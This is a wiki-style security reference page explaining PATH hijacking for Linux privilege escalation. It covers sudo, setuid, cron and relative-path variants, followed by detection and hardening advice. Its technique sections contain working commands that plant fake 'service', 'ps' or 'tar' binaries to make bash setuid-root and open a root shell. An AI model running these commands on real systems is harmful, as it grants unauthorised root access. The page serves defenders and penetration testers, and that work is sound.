---
title: PATH hijacking
slug: path-hijacking
---

> **TL;DR:** A privileged process invokes a command by name without an absolute path; the attacker manipulates `$PATH` (or writes into an existing PATH directory) so a malicious binary is found first.

## What it is
When a process calls `system("ifconfig ...")`, `popen("date", ...)`, or even `execlp("foo", ...)`, the runtime resolves the unqualified name via the inherited `$PATH`. If the privileged caller doesn't reset `PATH` to a known-safe value or use absolute paths, any directory in that PATH that's earlier than the system one — or any directory the attacker can write to — becomes a code-execution vector.

## Preconditions / where it applies
- A setuid binary, sudo-allowed command, cron job, or root-run service that calls an unqualified executable
- Either the attacker controls `$PATH` (env-keep in sudoers, no sanitization in service) OR a directory already on PATH is writable by the attacker
- Common on custom in-house C/Go/Python wrappers that shell out for convenience

## Technique

**Pattern A — env-controlled PATH (sudo).** sudoers lets `LD_PRELOAD` / `PATH` survive into the sudo'd command:
```text
user ALL=(root) NOPASSWD: SETENV: /opt/admin/checkstatus
```
The wrapper does something like `system("service nginx status")`:
```bash
echo -e '#!/bin/sh\nchmod +s /bin/bash' > /tmp/service
chmod +x /tmp/service
sudo PATH=/tmp:$PATH /opt/admin/checkstatus
/bin/bash -p
```

**Pattern B — env-controlled PATH (setuid).** Setuid binaries inherit `PATH` from the caller (the linker doesn't strip it; only `LD_*` env is dropped under `AT_SECURE`). If the setuid binary does `system("ps")`:
```bash
strings /usr/local/bin/oldsuid | grep -E '^(ps|date|ls|cat)$'
echo '/bin/bash -p' > /tmp/ps && chmod +x /tmp/ps
PATH=/tmp:$PATH /usr/local/bin/oldsuid
```

**Pattern C — writable directory already on a privileged PATH.** Cron typically sets `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`. If a packager mistakenly created `/usr/local/sbin` mode 0777 (or you have group write via a careless `chgrp`), plant a higher-priority binary:
```bash
ls -ld /usr/local/sbin
# drwxrwxrwx 2 root root ...

cat /etc/crontab | grep -i backup
# */5 * * * * root /opt/bin/runbackup.sh   ← runbackup.sh calls "tar ..."

echo -e '#!/bin/sh\ncp /bin/bash /tmp/r;chmod 4755 /tmp/r' > /usr/local/sbin/tar
chmod +x /usr/local/sbin/tar
# wait 5 min, /tmp/r is now suid-root
```

**Pattern D — relative-path quirks.** If a service does `system("./helper")`, control of CWD is enough. Less common but worth checking with `strace -f -e execve` on the target binary.

**Triage commands:**
```bash
strings /path/to/binary | grep -E '^[a-z_-]+$' | sort -u
# find unqualified names

ltrace -e system+execlp+execvp /path/to/binary 2>&1 | head
```

## Detection and defence
- Always use absolute paths in scripts and any setuid C code; reset `PATH` explicitly at process start
- `Defaults secure_path` in sudoers (set by default on RHEL/Debian) — never override
- AuditD rule on `execve` whose `comm` matches a system binary but `exe` is in `/tmp`, `/dev/shm`, or a user-writable dir
- Filesystem audits: no world-writable dirs on the cron/system PATH (`find /usr/local/{s,}bin -type d -perm -002`)

## References
- [HackTricks — PATH abuse](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#path-abuse) — recipes including suid + cron variants
- [sudoers(5)](https://man7.org/linux/man-pages/man5/sudoers.5.html) — `secure_path`, `env_keep` reference
- [PayloadsAllTheThings — Linux privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) — payload catalogue

Related: [[sudo-misconfig]], [[suid-sgid-binaries]], [[cron-jobs]].
